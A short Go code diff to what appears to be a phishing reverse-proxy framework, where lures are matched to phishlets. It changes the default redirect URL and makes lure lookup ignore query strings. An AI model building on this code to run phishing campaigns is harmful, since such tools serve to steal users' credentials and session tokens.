@@ -2,6 +2,7 @@ package core
 
 import (
 	"fmt"
+	"net/url"
 	"os"
 	"path/filepath"
 	"strings"
@@ -74,7 +75,7 @@ const (
 	CFG_KEY                = "none"
 )
 
-const DEFAULT_REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll
+const DEFAULT_REDIRECT_URL = "https://www.wikipedia.org/" // Rick'roll
 
 func NewConfig(cfg_dir string, path string) (*Config, error) {
 	log.Warning("NewConfig")
@@ -534,6 +535,23 @@ func (c *Config) GetLure(index int) (*Lure, error) {
 func (c *Config) GetLureByPath(site string, path string) (*Lure, error) {
 	log.Warning("GetLureByPath: %s %s", site, path)
 
+	url_lure, _ := url.Parse(path)
+
+	log.Warning("url_lure.RawQuery: %s", url_lure.RawQuery)
+
+	path = url_lure.Path
+
+	//queryValues := url_lure.Query()
+	//if cfgValue, exists := queryValues["cfg"]; exists {
+	//	log.Warning("Having Cfg : %s", cfgValue[0])
+	//
+	//
+	//
+	//} else {
+	//	log.Warning("Not Having Cfg ")
+	//
+	//}
+
 	for _, l := range c.lures {
 		if l.Phishlet == site {
 			if l.Path == path {
@@ -541,6 +559,7 @@ func (c *Config) GetLureByPath(site string, path string) (*Lure, error) {
 			}
 		}
 	}
+
 	return nil, fmt.Errorf("lure for path '%s' not found", path)
 }
 
